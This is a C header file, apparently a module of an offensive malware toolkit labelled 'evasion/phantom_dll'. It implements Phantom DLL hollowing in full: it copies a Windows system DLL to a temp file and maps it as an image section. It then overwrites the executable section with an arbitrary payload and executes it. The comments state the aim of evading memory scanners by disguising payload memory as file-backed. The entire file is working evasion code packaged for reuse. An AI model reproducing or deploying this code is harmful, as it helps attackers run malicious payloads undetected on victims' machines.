// chunk: evasion/phantom_dll
// depends: (none)
// provides: phantom_dll_exec
// risk: low
// note: Phantom DLL hollowing — creates a file-backed section from a legitimate
//       DLL (ntdll.dll copy), maps it into the current process, then overwrites
//       the mapped view with payload code. The resulting memory region appears
//       as MEM_IMAGE (file-backed) to memory scanners, not MEM_PRIVATE
//       (suspicious allocated memory). Defeats VAD-based detection that flags
//       unbacked executable regions. Based on Phantom DLL Hollowing by hasherezade.

#ifndef CHUNK_PHANTOM_DLL
#define CHUNK_PHANTOM_DLL

#include <windows.h>

typedef NTSTATUS (NTAPI *pNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

/*
 * phantom_dll_exec: Execute payload from a phantom (file-backed) memory region.
 *
 * 1. Copy a legit DLL to a temp file
 * 2. Create a section from the file
 * 3. Map the section (appears as MEM_IMAGE)
 * 4. Overwrite mapped content with our payload
 * 5. Execute
 *
 * payload: code to execute (position-independent or a function pointer table)
 * payload_size: size of payload
 *
 * Returns the result of the payload's entry point.
 */
static DWORD phantom_dll_exec(BYTE *payload, SIZE_T payload_size) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    pNtCreateSection NtCreateSection =
        (pNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection =
        (pNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");

    if (!NtCreateSection || !NtMapViewOfSection) return 0;

    /* Use a small, rarely-loaded system DLL as the phantom source */
    char src_path[MAX_PATH], tmp_path[MAX_PATH], tmp_dir[MAX_PATH];
    GetSystemDirectoryA(src_path, MAX_PATH);
    strcat(src_path, "\\wbem\\wmiutils.dll");

    GetTempPathA(MAX_PATH, tmp_dir);
    GetTempFileNameA(tmp_dir, "ph", 0, tmp_path);

    if (!CopyFileA(src_path, tmp_path, FALSE)) {
        /* Fallback: use a different DLL */
        GetSystemDirectoryA(src_path, MAX_PATH);
        strcat(src_path, "\\dbgcore.dll");
        if (!CopyFileA(src_path, tmp_path, FALSE))
            return 0;
    }

    /* Open the temp file */
    HANDLE hFile = CreateFileA(tmp_path, GENERIC_READ | GENERIC_WRITE,
                                FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DeleteFileA(tmp_path);
        return 0;
    }

    /* Create a section from the file (SEC_IMAGE makes it MEM_IMAGE when mapped) */
    HANDLE hSection = NULL;
    NTSTATUS status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS, NULL, NULL,
        PAGE_READONLY, SEC_IMAGE, hFile);
    CloseHandle(hFile);

    if (status != 0 || !hSection) {
        DeleteFileA(tmp_path);
        return 0;
    }

    /* Map the section into our process */
    PVOID base_addr = NULL;
    SIZE_T view_size = 0;
    status = NtMapViewOfSection(hSection, GetCurrentProcess(),
        &base_addr, 0, 0, NULL, &view_size,
        1 /* ViewShare */, 0, PAGE_EXECUTE_READWRITE);

    if (status != 0 || !base_addr) {
        CloseHandle(hSection);
        DeleteFileA(tmp_path);
        return 0;
    }

    /* Find the .text section in the mapped image */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base_addr;
    IMAGE_NT_HEADERS *pe = (IMAGE_NT_HEADERS *)((BYTE *)base_addr + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(pe);
    PVOID text_addr = NULL;
    SIZE_T text_size = 0;

    for (WORD i = 0; i < pe->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            text_addr = (BYTE *)base_addr + sec[i].VirtualAddress;
            text_size = sec[i].Misc.VirtualSize;
            break;
        }
    }

    if (!text_addr || text_size < payload_size) {
        if (NtUnmapViewOfSection)
            NtUnmapViewOfSection(GetCurrentProcess(), base_addr);
        CloseHandle(hSection);
        DeleteFileA(tmp_path);
        return 0;
    }

    /* Make the .text section writable */
    DWORD old_prot;
    VirtualProtect(text_addr, payload_size, PAGE_EXECUTE_READWRITE, &old_prot);

    /* Overwrite with our payload */
    memcpy(text_addr, payload, payload_size);

    /* Restore protection */
    VirtualProtect(text_addr, payload_size, PAGE_EXECUTE_READ, &old_prot);

    /* Execute the payload */
    typedef DWORD (*payload_fn)(void);
    DWORD result = ((payload_fn)text_addr)();

    /* Cleanup */
    if (NtUnmapViewOfSection)
        NtUnmapViewOfSection(GetCurrentProcess(), base_addr);
    CloseHandle(hSection);
    DeleteFileA(tmp_path);

    return result;
}

#endif
